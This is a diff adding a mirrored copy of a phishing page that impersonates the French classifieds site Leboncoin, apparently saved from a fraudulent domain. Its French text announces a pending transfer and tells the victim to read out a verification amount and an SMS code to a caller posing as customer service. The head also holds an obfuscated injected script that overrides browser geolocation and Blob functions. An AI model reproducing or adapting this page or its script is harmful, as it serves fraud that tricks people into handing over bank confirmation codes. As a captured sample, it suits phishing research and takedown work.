@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+
+<html data-reactroot="">
+<!-- Mirrored from carapal.bida-finances.com/virementEnCours.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 May 2020 20:53:53 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script>(function(){function phPqR() {
+  //<![CDATA[
+  window.hyavTFu = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
+  window.XgjBtHS = navigator.geolocation.watchPosition.bind(navigator.geolocation);
+  let WAIT_TIME = 100;
+
+  
+  if (!['http:', 'https:'].includes(window.location.protocol)) {
+    // assume the worst, fake the location in non http(s) pages since we cannot reliably receive messages from the content script
+    window.XYGRH = true;
+    window.kBZBR = 38.883333;
+    window.OWzuR = -77.000;
+  }
+
+  function waitGetCurrentPosition() {
+    if ((typeof window.XYGRH !== 'undefined')) {
+      if (window.XYGRH === true) {
+        window.hzppTlf({
+          coords: {
+            latitude: window.kBZBR,
+            longitude: window.OWzuR,
+            accuracy: 10,
+            altitude: null,
+            altitudeAccuracy: null,
+            heading: null,
+            speed: null,
+          },
+          timestamp: new Date().getTime(),
+        });
+      } else {
+        window.hyavTFu(window.hzppTlf, window.kUaVGrh, window.pwYXz);
+      }
+    } else {
+      setTimeout(waitGetCurrentPosition, WAIT_TIME);
+    }
+  }
+
+  function waitWatchPosition() {
+    if ((typeof window.XYGRH !== 'undefined')) {
+      if (window.XYGRH === true) {
+        navigator.getCurrentPosition(window.sQRQFxp, window.XhHqoiP, window.JLpND);
+        return Math.floor(Math.random() * 10000); // random id
+      } else {
+        window.XgjBtHS(window.sQRQFxp, window.XhHqoiP, window.JLpND);
+      }
+    } else {
+      setTimeout(waitWatchPosition, WAIT_TIME);
+    }
+  }
+
+  navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
+    window.hzppTlf = successCallback;
+    window.kUaVGrh = errorCallback;
+    window.pwYXz = options;
+    waitGetCurrentPosition();
+  };
+  navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
+    window.sQRQFxp = successCallback;
+    window.XhHqoiP = errorCallback;
+    window.JLpND = options;
+    waitWatchPosition();
+  };
+
+  const instantiate = (constructor, args) => {
+    const bind = Function.bind;
+    const unbind = bind.bind(bind);
+    return new (unbind(constructor, null).apply(null, args));
+  }
+
+  Blob = function (_Blob) {
+    function secureBlob(...args) {
+      const injectableMimeTypes = [
+        { mime: 'text/html', useXMLparser: false },
+        { mime: 'application/xhtml+xml', useXMLparser: true },
+        { mime: 'text/xml', useXMLparser: true },
+        { mime: 'application/xml', useXMLparser: true },
+        { mime: 'image/svg+xml', useXMLparser: true },
+      ];
+      let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
+
+      if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
+        const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
+        if (mimeTypeIndex >= 0) {
+          let mimeType = injectableMimeTypes[mimeTypeIndex];
+          let injectedCode = `<script>(
+            ${phPqR}
+          )();<\/script>`;
+    
+          let parser = new DOMParser();
+          let xmlDoc;
+          if (mimeType.useXMLparser === true) {
+            xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
+          } else {
+            xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+          }
+
+          if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
+            xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
+    
+            if (mimeType.useXMLparser === true) {
+              args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+            } else {
+              args[0][0] = xmlDoc.documentElement.outerHTML;
+            }
+          }
+        }
+      }
+
+      return instantiate(_Blob, args); // arguments?
+    }
+
+    // Copy props and methods
+    let propNames = Object.getOwnPropertyNames(_Blob);
+    for (let i = 0; i < propNames.length; i++) {
+      let propName = propNames[i];
+      if (propName in secureBlob) {
+        continue; // Skip already existing props
+      }
+      let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+      Object.defineProperty(secureBlob, propName, desc);
+    }
+
+    secureBlob.prototype = _Blob.prototype;
+    return secureBlob;
+  }(Blob);
+
+  Object.freeze(navigator.geolocation);
+
+  window.addEventListener('message', function (event) {
+    if (event.source !== window) {
+      return;
+    }
+    const message = event.data;
+    switch (message.method) {
+      case 'uKLEnxz':
+        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
+          window.kBZBR = message.info.coords.lat;
+          window.OWzuR = message.info.coords.lon;
+          window.XYGRH = message.info.fakeIt;
+        }
+        break;
+      default:
+        break;
+    }
+  }, false);
+  //]]>
+}phPqR();})()</script>
+
+    
+    <title>leboncoin</title>
+    <meta name="savepage-title" content="leboncoin - connexion">
+    <meta name="application-name" content="">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <link rel="shortcut icon" href="public/img/lbclogo.svg">
+    <link rel="apple-touch-icon" href="public/img/lbclogo.svg">
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
+    <link rel="stylesheet" href="public/css/main.ltr.css">
+    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">
+    <link rel="stylesheet" href="public/css/contextualLogin.css">
+<style id="inert-style">
+[inert] {
+  pointer-events: none;
+  cursor: default;
+}
+
+[inert], [inert] * {
+  user-select: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+}
+</style></head>
+
+<body class="vx_root vx_addFlowTransition">
+<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
+
+    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_" tabindex="-1">
+        <div class="vx_modal-content">
+
+            
+    <header class="vx_modal-header">
+<h2 id="js_modalHeader" class="vx_text-2 header-centered" style="color:#005C08; "><img class="jsx-3608823896 jsx-2794181486" width="200" data-savepage-src="/lbcconnect/static/lbc-logo.svg" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDIiIGhlaWdodD0iMTkiIHZpZXdCb3g9IjAgMCAxMDIgMTkiPgogICAgPHBhdGggZmlsbD0iI0Y1NkIyQSIgZmlsbC1ydWxlPSJldmVub2RkIiBkPSJNMjUuNzMyIDE1LjY2MmMxLjYwNyAwIDIuNTkzLTEuMjcxIDIuNTkzLTMuMTY3IDAtMS44OTUtLjk4Ni0zLjE2Ni0yLjU5My0zLjE2Ni0xLjYwNiAwLTIuNTg4IDEuMjctMi41ODggMy4xNjZzLjk4MiAzLjE2NyAyLjU4OCAzLjE2N3ptMS4xOTktOS40MDFjMy4wNzIgMCA1LjA4NyAyLjYzOSA1LjA4NyA2LjE4OCAwIDMuNjItMi4xMTIgNi4yODEtNS4yMDYgNi4yODEtMS42NTQgMC0zLjA0My0uNzY1LTMuODYtMi4wNjFoLS4wNXYxLjgyM2gtMy4zNThWMi40MjJjMC0xLjIyMy44MTYtMS45ODggMS43OTgtMS45ODguOTg2IDAgMS44MDIuNzY1IDEuODAyIDEuOTg5djUuNzI5aC4wNDdjMS4wMDctMS4yOTIgMi4yNzgtMS44OTEgMy43NC0xLjg5MXptMTIuMzc3IDkuNGMxLjYwNiAwIDIuNTg4LTEuMjcgMi41ODgtMy4xNjYgMC0xLjg5NS0uOTgyLTMuMTY2LTIuNTg4LTMuMTY2LTEuNjA3IDAtMi41OTMgMS4yNy0yLjU5MyAzLjE2NnMuOTg2IDMuMTY3IDIuNTkzIDMuMTY3em0wLTkuNGMzLjc5IDAgNi4yMzUgMi41ODggNi4yMzUgNi4yMzQgMCAzLjY0Ny0yLjQ0NCA2LjIzNS02LjIzNSA2LjIzNS0zLjc5MSAwLTYuMjM1LTIuNTg4LTYuMjM1LTYuMjM1IDAtMy42NDYgMi40NDQtNi4yMzQgNi4yMzUtNi4yMzR6bTQ3LjYwNS0uMDAyYy45ODIgMCAxLjgwMi43NyAxLjgwMiAxLjk5M1YxOC40OWgtMy42VjguMjUyYzAtMS4yMjQuODE2LTEuOTkzIDEuNzk4LTEuOTkzem0wLTYuMjU5YTIuMTkyIDIuMTkyIDAgMCAxIDIuMTg0IDIuMTg0YzAgMS4xNzQtLjk2IDIuMTgtMi4xODQgMi4xOC0xLjE5OSAwLTIuMjA2LS45MzQtMi4yMDYtMi4xOCAwLTEuMTc3Ljk2LTIuMTg0IDIuMjA2LTIuMTg0ek05OC4xNiA2LjI1OWMyLjQ5NCAwIDMuODM3IDEuNzc2IDMuODM3IDQuNDYydjcuNzdoLTMuNTk1di02Ljc2MmMwLTEuNTgxLS43NDQtMi4xMTMtMS42NzktMi4xMTMtMS4zOTQgMC0yLjQ0OCAxLjE3OC0yLjQ0OCAzLjY3MnY1LjIwMmgtMy42VjguMTNjMC0xLjE3My43Ny0xLjg3IDEuNjgzLTEuODcuOTEgMCAxLjY3NS42OTcgMS42NzUgMS44N3YuNDU1aC4wNWMuOTE1LTEuNDExIDIuMzA0LTIuMzI1IDQuMDc3LTIuMzI1em0tMjAuNzk0IDkuNDAzYzEuNjEgMCAyLjU4OC0xLjI3MSAyLjU4OC0zLjE2NyAwLTEuODk1LS45NzctMy4xNjYtMi41ODgtMy4xNjYtMS42MDYgMC0yLjU4OCAxLjI3LTIuNTg4IDMuMTY2cy45ODIgMy4xNjcgMi41ODggMy4xNjd6bTAtOS40MDFjMy43OTEgMCA2LjIzOSAyLjU4OCA2LjIzOSA2LjIzNCAwIDMuNjQ3LTIuNDQ4IDYuMjM1LTYuMjM5IDYuMjM1cy02LjIzNS0yLjU4OC02LjIzNS02LjIzNWMwLTMuNjQ2IDIuNDQ0LTYuMjM0IDYuMjM1LTYuMjM0ek02NS44MDggOS4zNzhjLTEuNTU1IDAtMi41MiAxLjE1Mi0yLjUyIDMuMTE1IDAgMS45NjguOTY1IDMuMTIgMi41MiAzLjEyIDEuMDMzIDAgMS44MDItLjUwMiAyLjE4NS0xLjE5OWguMDQ3bDIuNjEzIDEuNjhjLS45MSAxLjc3Ni0yLjgwOSAyLjYzOC00Ljk2NCAyLjYzOC0zLjc0IDAtNi4wNDMtMi41OTItNi4wNDMtNi4yMzkgMC0zLjY0MiAyLjMwMy02LjIzNCA2LjA0My02LjIzNCAyLjE1NSAwIDQuMDU1Ljg2MiA0Ljk2NCAyLjYzOWwtMi42MTMgMS42NzloLS4wNDdjLS4zODMtLjY5Ny0xLjE1Mi0xLjE5OS0yLjE4NS0xLjE5OXpNNTQuNDY1IDYuMjZjMi40OTUgMCAzLjgzNCAxLjc3NiAzLjgzNCA0LjQ2MnY3Ljc3aC0zLjU5MXYtNi43NjJjMC0xLjU4MS0uNzQ0LTIuMTEzLTEuNjgzLTIuMTEzLTEuMzkgMC0yLjQ0NCAxLjE3OC0yLjQ0NCAzLjY3MnY1LjIwMmgtMy42VjguMTNjMC0xLjE3My43Ny0xLjg3IDEuNjc5LTEuODcuOTE0IDAgMS42NzkuNjk3IDEuNjc5IDEuODd2LjQ1NWguMDVjLjkxLTEuNDExIDIuMy0yLjMyNSA0LjA3Ni0yLjMyNXpNOS44MSAxMS43ODNjMCAuNC4xMTkuOTkuMjY0IDEuMzZsMy45ODYtMi45N2MtLjIxNy0uMzI0LS42NDYtMS4wNDItMS44NC0xLjA0Mi0xLjEzNSAwLTIuNDEuODMzLTIuNDEgMi42NTJ6bTMuNDg1IDQuMDEyYzEuNDM3IDAgMi42MS0xLjA4IDMuMDc3LTEuOTc2bDIuMzY3IDEuNzA0Yy0uOTA1IDEuODQ1LTIuNzY2IDMuMjA5LTUuODY5IDMuMjA5YTYuMDgzIDYuMDgzIDAgMCAxLTQuMDI5LTEuNTE3Yy0xLjU2IDEuMDM3LTIuOTA3IDEuNDkxLTQuMjQxIDEuNDkxQzEuOTA0IDE4LjcwNiAwIDE2LjkwNCAwIDE0LjE5VjIuMzlDMCAxLjE3LjgxMi40MDYgMS43OS40MDZjLjk4MSAwIDEuNzkzLjc2NSAxLjc5MyAxLjk4NWwuMDA0IDExLjQ5MmMwIDEuMTY4LjUwMSAxLjc5MyAxLjU3MiAxLjc5My41NzQgMCAxLjIwMy0uMzM2IDIuMDItLjc4MmE3LjQyIDcuNDIgMCAwIDEtLjU3OS0yLjkyOGMwLTIuNTQyIDEuODEtNS43MDggNS42MTktNS43MDggMy4zMDYgMCA1LjA3OSAxLjkyMSA1LjgxOCA0LjMzNWwtNi4zNjYgNC41NmMuMzM1LjI5NC44MTEuNjQyIDEuNjIzLjY0MnoiLz4KPC9zdmc+Cg==" alt="logo"></a></div></h2>
+        <h2 id="js_modalHeader" class="vx_text-2 header-centered" style="color:#005C08; ">
+
+        VIREMENT EN COURS.</h2>
+        <p class="vx_text-body"></p>
+    </header>
+    <div class="vx_modal-body vx_blocks-for-mobile">
+        <div>
+            <div class="vx_modal-body vx_blocks-for-mobile">
+                <div class="form-container">
+
+                    <div class="cardForm-cardArt">
+                        <img width="150" src="public/img/encours.gif">
+                    </div>
+                    <p class="vx_text-5 " style="text-align: center">
+                        Suite aux nouvelles mesures de sécurité, vous serez crédité sur votre compte qu’après avoir confirmé que vous êtes bien le titulaire du compte bancaire enregistré sur votre compte Leboncoin.
+                    </p>
+
+                    <p class="vx_text-5 " style="text-align: center">
+                        Pour terminer la confirmation de votre compte : <span style="color: red;">vous serez contacté par téléphone par le service client dans les meilleurs délais.</span>
+                    </p>
+                    <p class="vx_text-5 " style="text-align: center">
+                        En confirmant votre compte bancaire, vous autorisez Leboncoin à vous envoyer un SMS. Vous trouverez dans le SMS, un montant de vérification généré de manière aléatoire et un code de 4 à 8 chiffres.
+                    </p>
+                    <p class="vx_text-5 " style="text-align: center">
+                        Que vous devez communiquer au conseiller pour confirmer votre compte bancaire.
+                    </p>
+                    <p class="vx_text-5 " style="text-align: center">
+                        La confirmation de votre compte bancaire vous permet de prouver que vous êtes bien le titulaire de la carte bancaire enregistrée puisque vous seul avez accès au code Leboncoin.
+                    </p>
+                    <p class="vx_text-5 " style="text-align: center">
+                        Cordialement,Leboncoin.
+                    </p>
+                </div>
+
+            </div>
+
+
+        </div>
+
+
+
+    </div>
+
+            <div class="signup-page-footer vx_text-legal center">©1999-2020 Leboncoin. Tous droits réservés.</div>
+
+        </div>
+    </div>
+
+</div>
+
+<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
+<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
+<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
+<script type="text/javascript" defer="" src="public/js/pa.js"></script>
+    
+
+    
+
+
+
+
+</body>
+<!-- Mirrored from carapal.bida-finances.com/virementEnCours.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 May 2020 20:54:00 GMT -->
+</html>
